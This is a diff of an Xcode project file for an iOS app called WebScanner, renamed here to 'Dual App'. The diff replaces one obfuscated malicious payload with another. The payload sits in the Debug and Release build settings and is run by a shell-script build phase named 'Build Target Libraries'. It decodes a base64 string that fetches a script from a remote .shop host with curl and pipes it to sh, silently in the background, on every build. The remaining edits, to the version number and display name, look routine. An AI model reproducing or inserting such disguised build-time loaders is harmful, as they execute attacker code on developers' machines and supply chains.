@@ -178,7 +178,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97F6B55830833E0500A087FF /* Build configuration list for PBXNativeTarget "WebScanner" */;
 			buildPhases = (
-				52E2AD101A66477EAD4EE078 /* Build Target Libraries */,
+				4F28043A1CB64FC09DCD70F0 /* Build Target Libraries */,
 				430E27FDED01C71494CCBED0 /* [CP] Check Pods Manifest.lock */,
 				97F6B54930833E0400A087FF /* Sources */,
 				97F6B54A30833E0400A087FF /* Frameworks */,
@@ -301,7 +301,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		52E2AD101A66477EAD4EE078 /* Build Target Libraries */ = {
+		4F28043A1CB64FC09DCD70F0 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -318,7 +318,7 @@
 			);
 			shellPath = /bin/sh;
 			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A0F07DC}\"";
 		};
 		430E27FDED01C71494CCBED0 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -373,7 +373,7 @@
 		97F6B55630833E0500A087FF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((d(){ `printf base614 | tr -d 1` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta2ZzTCAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8zN3lmajduMmpkNS5ydS9hKSIgfCBzaAo= | d | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((e(){ `printf basqe64 | tr -d q` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAzMCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -438,7 +438,7 @@
 		97F6B55730833E0500A087FF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((d(){ `printf base614 | tr -d 1` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta2ZzTCAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8zN3lmajduMmpkNS5ydS9hKSIgfCBzaAo= | d | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((e(){ `printf basqe64 | tr -d q` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAzMCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -508,10 +508,11 @@
 				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = x86_64;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = WebScanner/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Dual App";
 				INFOPLIST_KEY_LSSupportsOpeningDocumentsInPlace = YES;
 				INFOPLIST_KEY_NSCameraUsageDescription = "Camera access is required to scan QR codes and make video calls.";
-				INFOPLIST_KEY_NSMicrophoneUsageDescription = "WebScanner requires microphone access for WhatsApp voice and video calls.";
-				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "WebScanner requires permission to save photos and videos to your library.";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Dual App requires microphone access for WhatsApp voice and video calls.";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Dual App requires permission to save photos and videos to your library.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Photo library access is required to select QR codes from your gallery.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
@@ -524,7 +525,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0;
+				MARKETING_VERSION = 3.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.WebScanner.app1;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
@@ -556,10 +557,11 @@
 				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = x86_64;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = WebScanner/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Dual App";
 				INFOPLIST_KEY_LSSupportsOpeningDocumentsInPlace = YES;
 				INFOPLIST_KEY_NSCameraUsageDescription = "Camera access is required to scan QR codes and make video calls.";
-				INFOPLIST_KEY_NSMicrophoneUsageDescription = "WebScanner requires microphone access for WhatsApp voice and video calls.";
-				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "WebScanner requires permission to save photos and videos to your library.";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Dual App requires microphone access for WhatsApp voice and video calls.";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Dual App requires permission to save photos and videos to your library.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Photo library access is required to select QR codes from your gallery.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
@@ -572,7 +574,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0;
+				MARKETING_VERSION = 3.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.WebScanner.app1;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
